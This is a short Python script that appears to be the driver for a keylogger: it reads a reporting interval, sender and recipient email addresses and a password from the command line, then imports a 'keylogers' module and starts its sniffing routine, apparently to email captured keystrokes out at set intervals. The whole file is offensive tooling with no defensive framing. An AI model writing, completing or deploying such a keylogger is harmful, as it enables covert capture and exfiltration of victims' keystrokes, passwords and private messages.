import keylogers
import optparse

def user_input():
    parse=optparse.OptionParser()
    parse.add_option("-i","--interval",dest="interval",help="set the time")
    parse.add_option("-f","--from",dest="form",help="enter the from address")
    parse.add_option("-t","--to",dest="to",help="enter the to address")
    parse.add_option("-p","--pass",dest="password",help="enter the password")
    return parse.parse_args()



(userinput,arg)=user_input()
i=userinput.interval
f=userinput.form
t=userinput.to
p=userinput.password
my_keylogger=keylogers.sniff(int(i),f,t,p)
my_keylogger.start()
